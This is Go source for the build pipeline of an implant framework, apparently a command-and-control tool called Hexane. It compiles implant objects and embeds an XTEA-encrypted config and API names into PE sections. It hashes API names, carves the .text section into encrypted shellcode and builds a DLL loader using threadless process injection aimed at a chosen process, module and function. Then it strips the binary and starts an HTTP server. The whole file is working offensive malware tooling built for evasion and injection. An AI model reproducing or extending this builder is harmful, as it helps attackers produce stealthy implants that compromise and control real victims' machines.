package main

import (
	"bufio"
	"debug/pe"
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"time"
)

func GetLoaderComponents(h *HexaneConfig) []string {

	return []string{
		LoaderDll,
		h.Compiler.BuildDirectory + "/loader.asm.o",
		h.Compiler.BuildDirectory + "/resource.res",
		h.Compiler.BuildDirectory + "/loaders.cpp.o",
	}
}

func (h *HexaneConfig) Run() error {
	var err error
	if err = h.BuildUpdate(); err != nil {
		return err
	}

	go h.HttpServerHandler()
	time.Sleep(time.Millisecond * 500)

	return err
}

func (h *HexaneConfig) CreateIncludes(incs []string) string {
	var list string
	for _, inc := range incs {
		list += fmt.Sprintf(" -I%s ", inc)
	}
	return list
}

func (h *HexaneConfig) CreateArguments(args []string) string {
	var (
		list string
	)

	for _, arg := range args {
		list += fmt.Sprintf(" %s ", arg)
	}
	return list
}

func (h *HexaneConfig) CreateDefinitions(defs map[string][]byte) string {
	var list string

	if h.Implant.ProfileTypeId == TRANSPORT_HTTP {
		list += " -DTRANSPORT_HTTP "

	} else if h.Implant.ProfileTypeId == TRANSPORT_PIPE {
		list += " -DTRANSPORT_PIPE "
	}

	if h.Compiler.Debug {
		list += " -DDEBUG "
	}

	for name, def := range defs {
		arr := CreateCppArray(def, len(def))

		if def == nil {
			list += fmt.Sprintf(" -D%s ", name)
		} else {
			list += fmt.Sprintf(" -D%s=%s ", name, arr)
		}
	}
	return list
}

func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, output string, key []byte) error {
	var (
		Command string
		err     error
	)

	Command += command

	if targets != nil {
		Command += h.CreateArguments(targets)
	}

	if key != nil {
		Command += h.CreateDefinitions(map[string][]byte{"OBF_KEY": key})
	}

	if includes != nil {
		Command += h.CreateIncludes(includes)
	}

	if flags != nil {
		Command += h.CreateArguments(flags)
	}

	Command += fmt.Sprintf(" -o %s ", output)

	if err = h.RunCommand(Command); err != nil {
		return err
	}
	return nil
}

func GenerateHashes() error {
	var (
		err      error
		hashFile *os.File
		strFile  *os.File
	)

	WrapMessage("DBG", "generating hashes")
	if strFile, err = os.Open(StringsFile); err != nil {
		return err
	}

	defer strFile.Close()

	if hashFile, err = os.Create(HashHeader); err != nil {
		return err
	}

	scanner := bufio.NewScanner(strFile)
	writer := bufio.NewWriter(hashFile)
	names := make([]string, 0)

	for scanner.Scan() {
		line := scanner.Text()
		names = append(names, line)
	}

	hashes := make([]string, 0)
	for _, str := range names {
		hashes = append(hashes, GetHashFromString(str))
	}

	for _, hash := range hashes {
		if _, err = writer.WriteString(hash + "\n"); err != nil {
			return err
		}
	}

	if err = writer.Flush(); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) GenerateConfig() error {
	var (
		Patch []byte
		Xtea  []byte
		err   error
	)

	WrapMessage("DBG", "generating new implant config")

	h.Key = nil
	h.Key = SeCreateKey(16)

	if Patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	if Xtea, err = CryptXtea(Patch[16:], h.Key, true); err != nil {
		return err
	}

	h.Config = Xtea
	return nil
}

func (h *HexaneConfig) EmbedConfigBytes(path string, targetSection string, bytes []byte) error {
	var (
		file   *os.File
		peFile *pe.File
		data   []byte
		err    error
	)

	if file, err = os.OpenFile(path, os.O_RDWR, 0644); err != nil {
		return err
	}
	defer file.Close()

	if peFile, err = pe.NewFile(file); err != nil {
		return err
	}
	defer peFile.Close()

	var Section *pe.Section
	for _, s := range peFile.Sections {
		if s.Name == targetSection {
			Section = s
			break
		}
	}

	if Section == nil {
		return fmt.Errorf("section %s not found", targetSection)
	}

	if uint32(len(bytes)) > Section.Size {
		return fmt.Errorf("section %s is not large enough", targetSection)
	}

	if data, err = Section.Data(); err != nil {
		return err
	}

	newSection := make([]byte, len(bytes))
	copy(newSection, data)
	copy(newSection, bytes)

	if _, err = file.Seek(int64(Section.Offset), os.SEEK_SET); err != nil {
		return err
	}

	if _, err = file.Write(newSection); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) EmbedConfigStrings(path string, targetSection string, strings []string) error {
	var (
		file   *os.File
		peFile *pe.File
		stream Stream
		data   []byte
		err    error
	)

	for _, str := range strings {
		stream.AddString(str)
	}

	if file, err = os.OpenFile(path, os.O_RDWR, 0644); err != nil {
		return err
	}
	defer file.Close()

	if peFile, err = pe.NewFile(file); err != nil {
		return err
	}
	defer peFile.Close()

	var Section *pe.Section
	for _, s := range peFile.Sections {
		if s.Name == targetSection {
			Section = s
			break
		}
	}

	if Section == nil {
		return fmt.Errorf("section %s not found", targetSection)
	}

	if uint32(stream.Length) > Section.Size {
		return fmt.Errorf("section %s is not large enough", targetSection)
	}

	if data, err = Section.Data(); err != nil {
		return err
	}

	newSection := make([]byte, stream.Length)
	copy(newSection, data)
	copy(newSection, stream.Buffer)

	if _, err = file.Seek(int64(Section.Offset), os.SEEK_SET); err != nil {
		return err
	}

	if _, err = file.Write(newSection); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	var (
		err          error
		InjectMethod string
		InjectConfig map[string][]byte
	)

	if h.Implant.Injection.Threadless != nil {
		InjectMethod = h.Implant.Injection.Threadless.LdrExecute

		InjectConfig = map[string][]byte{
			"OBF_KEY": h.Key,
			"PARENT":  []byte(h.Implant.Injection.Threadless.ProcName),
			"MODULE":  []byte(h.Implant.Injection.Threadless.ModuleName),
			"FUNC":    []byte(h.Implant.Injection.Threadless.FuncName),
		}
	}

	WrapMessage("DBG", "generating resource loader")
	Resource := h.Compiler.BuildDirectory + "/resource.res"
	RsrcFile := "\\\"" + h.Compiler.BuildDirectory + "/shellcode.bin" + "\\\""

	if err = h.RunCommand(h.Compiler.RsrcCompiler + " -O coff " + RsrcScript + " -DBUILDPATH=\"" + RsrcFile + "\" -o " + Resource); err != nil {
		return err
	}

	Loader := h.Compiler.BuildDirectory + "/loader.bin"
	LoaderObject := h.Compiler.BuildDirectory + "/loader.asm.o"

	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObject + " " + Loader); err == nil {
		if InjectConfig["LOADER"], err = os.ReadFile(Loader); err != nil {
			return err
		}
	} else {
		return err
	}

	InjectObject := h.Compiler.BuildDirectory + "/" + filepath.Base(InjectMethod) + ".o"
	LoaderComponents := GetLoaderComponents(h)
	LoaderComponents = append(LoaderComponents, InjectObject)

	WrapMessage("INF", fmt.Sprintf("generating object file for %s", InjectMethod))
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectMethod}, nil, h.Compiler.IncludeDirs, InjectObject, h.Key); err != nil {
		return err
	}

	LoaderObjects := h.Compiler.BuildDirectory + "/loaders.cpp.o"
	// InjectConfig will need to be added using h.EmbedConfigStrings/EmbedConfigBytes
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{LoadersCpp, InjectObject}, nil, h.Compiler.IncludeDirs, LoaderObjects, h.Key); err != nil {
		return err
	}

	RsrcLoader := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension

	WrapMessage("INF", "generating dll rsrc loader")
	if err = h.CompileObject(h.Compiler.Mingw, LoaderComponents, []string{"-shared"}, h.Compiler.IncludeDirs, RsrcLoader, h.Key); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		if err = h.RunCommand(h.Compiler.Strip + " " + RsrcLoader); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) GenerateShellcode() error {
	var (
		data   *os.File
		peFile *pe.File
		text   *pe.Section
		err    error
	)

	WrapMessage("INF", "generating shellcode")
	if data, err = os.Open(h.Compiler.BuildDirectory + "/interm.exe"); err != nil {
		return err
	}
	defer data.Close()

	if peFile, err = pe.NewFile(data); err != nil {
		return err
	}

	for _, section := range peFile.Sections {
		if section.Name == ".text" {
			text = section
			break
		}
	}

	if text == nil {
		return fmt.Errorf(" .text section was not found")
	}

	Shellcode := h.Compiler.BuildDirectory + "/shellcode.bin"
	outData := make([]byte, text.Size)

	if _, err = data.ReadAt(outData, int64(text.Offset)); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		WrapMessage("INF", "encrypting shellcode with XTEA")

		h.Key = SeCreateKey(16)
		if outData, err = CryptXtea(outData, h.Key, true); err != nil {
			return err
		}
	}

	if err = WriteFile(Shellcode, outData); err != nil {
		return err
	}

	WrapMessage("DBG", "shellcode generated at "+Shellcode)
	return nil
}

func (h *HexaneConfig) GenerateObjects() error {
	var (
		files []os.DirEntry
		dir   string
		err   error
	)

	WrapMessage("DBG", "generating core object files")
	var RequiredMods = []string{
		string(h.Key),
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
	}

	for _, dir = range h.Compiler.ComponentDirs {
		if files, err = os.ReadDir(dir); err != nil {
			return err
		}

		for _, file := range files {
			if file.Name() == ".idea" {
				continue
			}

			FilePath := cwd + "/" + dir + "/" + file.Name()
			ObjFile := cwd + "/" + h.Compiler.BuildDirectory + "/" + file.Name() + ".o"

			if path.Ext(file.Name()) == ".cpp" {
				if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{FilePath}, h.Compiler.Flags, []string{cwd + "/../"}, ObjFile, h.Key); err != nil {
					return err
				}
				if file.Name() == "core.cpp" {
					if err = h.EmbedConfigBytes(ObjFile, ".text$F", h.Config); err != nil {
						return err
					}
					if err = h.EmbedConfigStrings(ObjFile, ".text$G", RequiredMods); err != nil {
						return err
					}
				}
				h.Components = append(h.Components, ObjFile)

			} else if path.Ext(file.Name()) == ".asm" {
				if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{FilePath}, nil, nil, ObjFile, h.Key); err != nil {
					return err
				}
				h.Components = append(h.Components, ObjFile)
			}
		}
	}

	WrapMessage("DBG", "building intermediate object")
	Intermediate := h.Compiler.BuildDirectory + "/interm.exe"

	if err = h.CompileObject(h.Compiler.Linker+" -T "+Ld, h.Components, nil, h.Compiler.IncludeDirs, Intermediate, nil); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) RunCommand(cmd string) error {
	var (
		Command *exec.Cmd
		Log     *os.File
		LogName string
		err     error
	)

	LogName = "../logs/" + strconv.Itoa(int(h.Implant.PeerId)) + "-build-error.log"

	if Log, err = os.Create(LogName); err != nil {
		return err
	}

	defer Log.Close()

	Command = exec.Command("bash", "-c", cmd)
	Command.Stdout = Log
	Command.Stderr = Log

	fmt.Printf("running command : %s\n\n", Command.String())

	if err = Command.Run(); err != nil {
		WrapMessage("ERR", err.Error())
		return fmt.Errorf("compilation error. Check %s for details", LogName)
	}

	return nil
}

func (h *HexaneConfig) BuildUpdate() error {
	var (
		err error
	)

	WrapMessage("INF", "starting build...")

	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	if err = h.GenerateConfig(); err != nil {
		return err
	}

	if err = GenerateHashes(); err != nil {
		return err
	}

	if err = h.GenerateObjects(); err != nil {
		return err
	}

	if err = h.GenerateShellcode(); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		if err = h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
